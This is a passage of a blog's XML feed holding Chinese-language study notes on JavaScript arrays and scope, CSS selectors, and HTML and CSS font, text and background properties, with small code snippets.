class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="将arguments转化为数组"><a href="#将arguments转化为数组" class="headerlink" title="将arguments转化为数组"></a>将arguments转化为数组</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function toArray(arrayLikeObject) &#123;</span><br><span class="line">    return Array.prototype.slice.call(arrayLikeObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="异常捕获"><a href="#异常捕获" class="headerlink" title="异常捕获"></a>异常捕获</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function getPerson(id) &#123;</span><br><span class="line">    if (id &lt; 0) &#123;</span><br><span class="line">        throw new Error(&apos;ID must not be negative:&apos; + id);</span><br><span class="line">    &#125;</span><br><span class="line">    return &#123; id:id &#125;;</span><br><span class="line">&#125;</span><br><span class="line">function getPerson(ids) &#123;</span><br><span class="line">    var result = [];</span><br><span class="line">    ids.forEach(function(id) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            var person = getPerson(id);</span><br><span class="line">            result.push(person);</span><br><span class="line">        &#125; catch (exception) &#123;</span><br><span class="line">            console.log(exception);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="严格模式"><a href="#严格模式" class="headerlink" title="严格模式"></a>严格模式</h3><p><code>&lt;script&gt;</code>标签第一行输入 <code>&#39;use strict&#39;</code><br>或在每一个函数中激活<br><code>&#39;use strict&#39;;</code></p><h3 id="变量作用域和闭包"><a href="#变量作用域和闭包" class="headerlink" title="变量作用域和闭包"></a>变量作用域和闭包</h3><p>一个变量的作用域总是完整的函数<br>提升特性，声明会被移动到函数开始处<br>闭包，每个函数都和他周围的变量保持连接<br>IIFE模式，防止成为全局变量，用函数限制作用域</p><h3 id="对象和构造函数"><a href="#对象和构造函数" class="headerlink" title="对象和构造函数"></a>对象和构造函数</h3><p>可以用delete移除属性</p><p>任意属性名</p><p>提取方法使用bind()方法</p><p>方法中的函数无法使用this，两种解决方法:保存在另一个变量中，利用函数参数传入</p><p>构造函数</p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>数组可以拥有自定义属性。<br>索引 $i$ 是数字 $0\leqslant i &lt; 2^32-1$</p><h4 id="length"><a href="#length" class="headerlink" title="length"></a>length</h4><p>不是函数，数组的一个属性。</p><h4 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h4><p>需要手动创建<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var rows = [];</span><br><span class="line">for(var i=0; i&lt;3; i++) &#123;</span><br><span class="line">    rows[i]=[];</span><br><span class="line">    for(var j=0; j&lt;3; j++) &#123;</span><br><span class="line">        rows[i][j]=1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="in"><a href="#in" class="headerlink" title="in"></a>in</h4><p>检查的索引值。</p><h4 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h4><p>length的基本功能是追踪数组的最大索引。</p><p>可以直接修改长度…多加少减。</p><h4 id="添加和删除元素（破坏性地）"><a href="#添加和删除元素（破坏性地）" class="headerlink" title="添加和删除元素（破坏性地）"></a>添加和删除元素（破坏性地）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Array.prototype.shift() // 移除索引0处的元素，随后元素索引依次-1</span><br><span class="line">Array.prototype.unshift(elem1?, elem2?, ...) // 在数组最前面添加给定元素，返回新的数组长度</span><br><span class="line">Array.prototype.pop() // 移除数组最后的元素并返回该元素</span><br><span class="line">Array.prototype.push() // 在数组尾部添加该元素，返回新的数组长度</span><br><span class="line"></span><br><span class="line">// 破坏性地吧arr2添加到arr1后</span><br><span class="line">Array.prototype.push.apply(arr1, arr2)</span><br><span class="line"></span><br><span class="line">Array.prototype.splice(start, deleteCount?, elem1?, elem2?, ...) </span><br><span class="line">// 从start开始移除deleteCount个元素，并插入给定元素</span><br><span class="line">// start可以是负数，-1指向最后的元素，以此类推</span><br><span class="line">// deleteCount是可选的，若省略（连同所有后续的参数），那么将移除之后所有的元素</span><br></pre></td></tr></table></figure><h4 id="排序和颠倒元素顺序（破坏性地）"><a href="#排序和颠倒元素顺序（破坏性地）" class="headerlink" title="排序和颠倒元素顺序（破坏性地）"></a>排序和颠倒元素顺序（破坏性地）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Array.prototype.reverse() // 颠倒顺序</span><br><span class="line"></span><br><span class="line">Array.prototype.sort(compareFunction?) </span><br><span class="line">// 排序，转化为字符串比较</span><br><span class="line">// function compareFunction(a, b) 比较ab，返回负数(a&lt;b)；返回0(a=b)；返回正数(a&gt;b)</span><br></pre></td></tr></table></figure><h4 id="合并、切分和连接（非破坏性地）"><a href="#合并、切分和连接（非破坏性地）" class="headerlink" title="合并、切分和连接（非破坏性地）"></a>合并、切分和连接（非破坏性地）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Array.prototype.concat(arr1?, arr2?, ...) // 创建一个新数组</span><br><span class="line"></span><br><span class="line">Array.prototype.slice(begin?, end?) </span><br><span class="line">// 将[begin,end)复制到新数组，缺少end使用数组长度，都缺少复制整个数组。若任意索引时负值，那么加上数组长度</span><br><span class="line"></span><br><span class="line">Array.prototype.join(separator?) </span><br><span class="line">// 对所有数组元素创建字符串，用separator连接，若缺少，默认为&apos;,&apos;</span><br></pre></td></tr></table></figure><h4 id="值的查找（非破坏性地）"><a href="#值的查找（非破坏性地）" class="headerlink" title="值的查找（非破坏性地）"></a>值的查找（非破坏性地）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Array.prototype.indexOf(searchValue, startIndex?)</span><br><span class="line">// 从startIndex开始查找searchValue，返回第一次出现的位置，没有找到返回-1。若缺少startIndex查找整个数组。</span><br><span class="line">// 查找使用严格相等</span><br><span class="line"></span><br><span class="line">Array.prototype.lastIndexOf(searchElement, startIndex?)</span><br><span class="line">// 从startIndex反向查找searchValue返回第一次出现的索引，若没有找到返回-1，缺少startIndex查找整个数组</span><br><span class="line">// 查找使用严格相等</span><br></pre></td></tr></table></figure><h4 id="迭代（非破坏性地）"><a href="#迭代（非破坏性地）" class="headerlink" title="迭代（非破坏性地）"></a>迭代（非破坏性地）</h4><p>检查方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">arr.examinationMethod(callback, thisValue?)</span><br><span class="line">function callback(element, index, array)</span><br><span class="line">thisValue可以配置callback内的this</span><br><span class="line"></span><br><span class="line">Array.prototype.forEach(callback, thisValue?)</span><br><span class="line">Array.prototype.every(callback, thisValue?) </span><br><span class="line">// 若对于每个元素回调函数都返回true则返回true，一旦返回false则停止迭代，返回false</span><br><span class="line">// undefined也会被解释成false</span><br><span class="line">// 如果数组是空的，结果是true，且不调用callback</span><br><span class="line"></span><br><span class="line">Array.prototype.some(callback, thisValue?) </span><br><span class="line">// 至少一个返回true则返回true，若回调函数返回true则停止迭代</span><br><span class="line">// undefined也会被解释成false</span><br><span class="line">// 如果数组是空的，结果是false，且不调用callback</span><br></pre></td></tr></table></figure></p><p>转化方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Array.prototype.map(callback, thisValue?)</span><br><span class="line">// 对每个元素应用callback的结果</span><br><span class="line"></span><br><span class="line">Array.prototype.filter(callback, thisValue?)</span><br><span class="line">// 返回callback为true的元素</span><br></pre></td></tr></table></figure></p><p>归约函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">callback函数有所不同</span><br><span class="line">function callback(previousValue, currentElement, currentIndex, array)</span><br><span class="line">// previousValue 是会掉函数返回之前的值</span><br><span class="line">// 提供显式initialValue，previousValue是initialValue，currentElement是数组第一个元素(reduceRight: 数组最后一个元素)</span><br><span class="line">// 未提供显式initalValue，previousValue是数组第一个元素，currentElement是数组第二个元素(reduceRight: 数组最后一个和倒数第二个元素)</span><br><span class="line"></span><br><span class="line">Array.prototype.reduce(callback, initialValue?)</span><br><span class="line">// 从左到右遍历，返回回调函数最后的值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Array.prototype.reduceRight(callback, initialValue?)</span><br><span class="line">// 从右到左遍历，返回回调函数最后的值</span><br></pre></td></tr></table></figure></p><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>test()<br>exec()<br>replace()</p><h3 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h3><h3 id="标准库"><a href="#标准库" class="headerlink" title="标准库"></a>标准库</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>《深入理解JavaScript》</li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS笔记</title>
      <link href="/blog/note-css/"/>
      <url>/blog/note-css/</url>
      
        <content type="html"><![CDATA[<h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt; HTML注释</span><br><span class="line">/*   */ CSS注释</span><br></pre></td></tr></table></figure><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">选择器 &#123;</span><br><span class="line">    属性1:属性值1;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="元素选择器"><a href="#元素选择器" class="headerlink" title="元素选择器"></a>元素选择器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">元素选择器 &#123;</span><br><span class="line">    属性1:属性值1;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ID选择器"><a href="#ID选择器" class="headerlink" title="ID选择器"></a>ID选择器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#ID选择器 &#123;</span><br><span class="line">    属性1:属性值1;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="类选择器"><a href="#类选择器" class="headerlink" title="类选择器"></a>类选择器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.类选择器 &#123;</span><br><span class="line">    属性1:属性值1;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="多类选择器"><a href="#多类选择器" class="headerlink" title="多类选择器"></a>多类选择器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.类选择器1.类选择器2... &#123;</span><br><span class="line">    属性1:属性值1;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="伪类选择器"><a href="#伪类选择器" class="headerlink" title="伪类选择器"></a>伪类选择器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">选择器:伪类 &#123;</span><br><span class="line">    属性1:属性值1;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">:active         被激活的元素</span><br><span class="line">:hover          鼠标悬浮元素上方</span><br><span class="line">:link           未被访问的链接</span><br><span class="line">:visited        被访问的链接</span><br><span class="line">:focus          被选中的元素</span><br><span class="line">:first-child    每一层元素指定类型的第一个子元素</span><br><span class="line">:lang           带有指定lang属性的元素</span><br></pre></td></tr></table></figure></p><h3 id="伪元素选择器"><a href="#伪元素选择器" class="headerlink" title="伪元素选择器"></a>伪元素选择器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">选择器:伪元素 &#123;</span><br><span class="line">    属性1:属性值1;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪元素<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">:first-letter   文本第一个字符</span><br><span class="line">:first-line     文本首行</span><br><span class="line">:before         选择器选择元素之前</span><br><span class="line">:after          选择器选择元素之后</span><br></pre></td></tr></table></figure></p><h3 id="通用选择器"><a href="#通用选择器" class="headerlink" title="通用选择器"></a>通用选择器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">    属性1:属性值1;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="交集选择器"><a href="#交集选择器" class="headerlink" title="交集选择器"></a>交集选择器</h3><p>样式重叠 都具有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">元素选择器.类选择器 | #ID选择器 &#123;</span><br><span class="line">    属性1:属性值1;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="并集选择器"><a href="#并集选择器" class="headerlink" title="并集选择器"></a>并集选择器</h3><p>集体声明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">选择器1,</span><br><span class="line">选择器2,</span><br><span class="line">... &#123;</span><br><span class="line">    属性1:属性值1;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="后代选择器"><a href="#后代选择器" class="headerlink" title="后代选择器"></a>后代选择器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">选择器1 选择器2 ... &#123;</span><br><span class="line">    属性1:属性值1;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="子元素选择器"><a href="#子元素选择器" class="headerlink" title="子元素选择器"></a>子元素选择器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">选择器1&gt; 选择器2 &#123;</span><br><span class="line">    属性1:属性值1;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="相邻兄弟选择器"><a href="#相邻兄弟选择器" class="headerlink" title="相邻兄弟选择器"></a>相邻兄弟选择器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">选择器1+选择器2 &#123;</span><br><span class="line">    属性1:属性值1;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">属性选择器1属性选择器2... &#123;</span><br><span class="line">    属性1:属性值1;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>常见属性选择器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[属性]          带有指定属性的元素</span><br><span class="line">[属性=值]       带有指定属性和值的元素</span><br><span class="line">[属性~=值]      属性值包含指定值的元素，完整单词</span><br><span class="line">[属性|=值]      属性值以指定值开头，完整单词或后带有&apos;-&apos;连接符</span><br><span class="line">[属性^=值]      属性值以指定值开头的元素</span><br><span class="line">[属性$=值]      属性值以指定值结尾的元素</span><br><span class="line">[属性*=值]      属性值中包含指定值的元素</span><br></pre></td></tr></table></figure></p><h3 id="应用到HTML的方式"><a href="#应用到HTML的方式" class="headerlink" title="应用到HTML的方式"></a>应用到HTML的方式</h3><ul><li>行内式<code>&lt;标签名 style=&quot;属性名1:属性值1;...&quot; ...&gt;</code></li><li><p>内嵌式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">选择器 &#123;</span><br><span class="line">    属性1:属性值1;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></li><li><p>链接式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;*.css&quot; /&gt;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML笔记</title>
      <link href="/blog/note-html/"/>
      <url>/blog/note-html/</url>
      
        <content type="html"><![CDATA[<p>这1k多行的Markdown我大概写了一个多月，差不多俩月qwq</p><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><h3 id="基本标记标签"><a href="#基本标记标签" class="headerlink" title="基本标记标签"></a>基本标记标签</h3><h4 id="文档类型声明"><a href="#文档类型声明" class="headerlink" title="文档类型声明"></a>文档类型声明</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHRML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br></pre></td></tr></table></figure><p>HTML5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br></pre></td></tr></table></figure></p><h4 id="lt-html-gt-lt-html-gt"><a href="#lt-html-gt-lt-html-gt" class="headerlink" title="&lt;html&gt;&lt;/html&gt;"></a><code>&lt;html&gt;&lt;/html&gt;</code></h4><h4 id="lt-head-gt-lt-head-gt"><a href="#lt-head-gt-lt-head-gt" class="headerlink" title="&lt;head&gt;&lt;/head&gt;"></a><code>&lt;head&gt;&lt;/head&gt;</code></h4><h4 id="lt-title-gt-lt-title-gt"><a href="#lt-title-gt-lt-title-gt" class="headerlink" title="&lt;title&gt;&lt;/title&gt;"></a><code>&lt;title&gt;&lt;/title&gt;</code></h4><h4 id="lt-meta-gt-文档元数据"><a href="#lt-meta-gt-文档元数据" class="headerlink" title="&lt;meta&gt; 文档元数据"></a><code>&lt;meta&gt;</code> 文档元数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta htt[-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=字符集&quot;&gt;</span><br></pre></td></tr></table></figure><p>HTML5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;字符集&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>关键字<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;keywords&quot; contenet&quot; , , , &quot;&gt;</span><br></pre></td></tr></table></figure></p><p>网页描述信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;discription&quot; content=&quot;网页描述信息&quot;&gt;</span><br></pre></td></tr></table></figure></p><h4 id="lt-body-gt-lt-body-gt"><a href="#lt-body-gt-lt-body-gt" class="headerlink" title="&lt;body&gt;&lt;/body&gt;"></a><code>&lt;body&gt;&lt;/body&gt;</code></h4><h4 id="html注释"><a href="#html注释" class="headerlink" title="html注释"></a>html注释</h4><p><code>&lt;!-- --&gt;</code></p><h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><h3 id="字体粗细"><a href="#字体粗细" class="headerlink" title="字体粗细"></a>字体粗细</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">font-weight: normal | bold | bolder | number(100,900) | inherit;</span><br></pre></td></tr></table></figure><h3 id="字体风格"><a href="#字体风格" class="headerlink" title="字体风格"></a>字体风格</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">font-style: normal | italic | oblique | inhert;</span><br></pre></td></tr></table></figure><p><code>italic | oblique</code> 均为倾斜字体 常用 <code>italic</code></p><h3 id="字体大小"><a href="#字体大小" class="headerlink" title="字体大小"></a>字体大小</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">font-size: medium | length | n% | inherit;</span><br></pre></td></tr></table></figure><p><code>length: px | pt | em</code></p><h3 id="字体族属性"><a href="#字体族属性" class="headerlink" title="字体族属性"></a>字体族属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">font-family: 字体族1,字体族2,...,通用字体族 |inherit;</span><br></pre></td></tr></table></figure><h3 id="行高"><a href="#行高" class="headerlink" title="行高"></a>行高</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">line-height: normal | number | length | n% | inherit</span><br></pre></td></tr></table></figure><h3 id="字体属性"><a href="#字体属性" class="headerlink" title="字体属性"></a>字体属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">font: [font-style][font-weihgt] font-size/line-height font-family;</span><br></pre></td></tr></table></figure><p><code>[]</code>内的可没有 其他属性必须有 并且<code>/</code>不可省略</p><h2 id="文本属性"><a href="#文本属性" class="headerlink" title="文本属性"></a>文本属性</h2><h3 id="颜色"><a href="#颜色" class="headerlink" title="颜色"></a>颜色</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">color: 颜色英文名 | 颜色十六进制 | RGB | inherit;</span><br></pre></td></tr></table></figure><p>一种省略表示方式：<br>RGB3位全相同可只写3位</p><h3 id="水平对齐属性"><a href="#水平对齐属性" class="headerlink" title="水平对齐属性"></a>水平对齐属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text-align: left | right | center | inherit;</span><br></pre></td></tr></table></figure><h3 id="首行缩进属性"><a href="#首行缩进属性" class="headerlink" title="首行缩进属性"></a>首行缩进属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text-indent: length | n% | inherit;</span><br></pre></td></tr></table></figure><h3 id="文本修饰属性"><a href="#文本修饰属性" class="headerlink" title="文本修饰属性"></a>文本修饰属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text-decoration: none | underline | overline | line-through | inherit;</span><br><span class="line">无修饰 | 下划线 | 上划线 | 删除线 | 继承父属性</span><br></pre></td></tr></table></figure><h3 id="字符间距属性"><a href="#字符间距属性" class="headerlink" title="字符间距属性"></a>字符间距属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">letter-spacing: normal | length |inherit;</span><br></pre></td></tr></table></figure><h3 id="字间距属性"><a href="#字间距属性" class="headerlink" title="字间距属性"></a>字间距属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">word-spacing: normal | length | inherit;</span><br></pre></td></tr></table></figure><h2 id="背景属性"><a href="#背景属性" class="headerlink" title="背景属性"></a>背景属性</h2><h3 id="背景颜色属性"><a href="#背景颜色属性" class="headerlink" title="背景颜色属性"></a>背景颜色属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-color: 英文单词 | RBG | transparent | inherit;</span><br></pre></td></tr></table></figure><h3 id="背景图片属性"><a href="#背景图片属性" class="headerlink" title="背景图片属性"></a>背景图片属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-image: url(image_file_path) | inherit;</span><br></pre></td></tr></table></figure><h3 id="背景图片重复属性"><a href="#背景图片重复属性" class="headerlink" title="背景图片重复属性"></a>背景图片重复属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-repeat: repeat | repeat-x | repeat-y | no-repeat | inherit;</span><br></pre></td></tr></table></figure><h3 id="背景图片位置属性"><a href="#背景图片位置属性" class="headerlink" title="背景图片位置属性"></a>背景图片位置属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">background-position: 表示位置的关键字 | x% y% | xpos ypos;</span><br><span class="line">关键字 top/center/bottom left/center/right;</span><br></pre></td></tr></table></figure><h3 id="背景图片滚动属性"><a href="#背景图片滚动属性" class="headerlink" title="背景图片滚动属性"></a>背景图片滚动属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">background-attachment: scroll | fixed | inherit;</span><br><span class="line">默认值滚动 | 背景图片不滚动 | 继承父属性</span><br></pre></td></tr></table></figure><h3 id="背景属性-1"><a href="#背景属性-1" class="headerlink" title="背景属性"></a>背景属性</h3><figure class="highlight 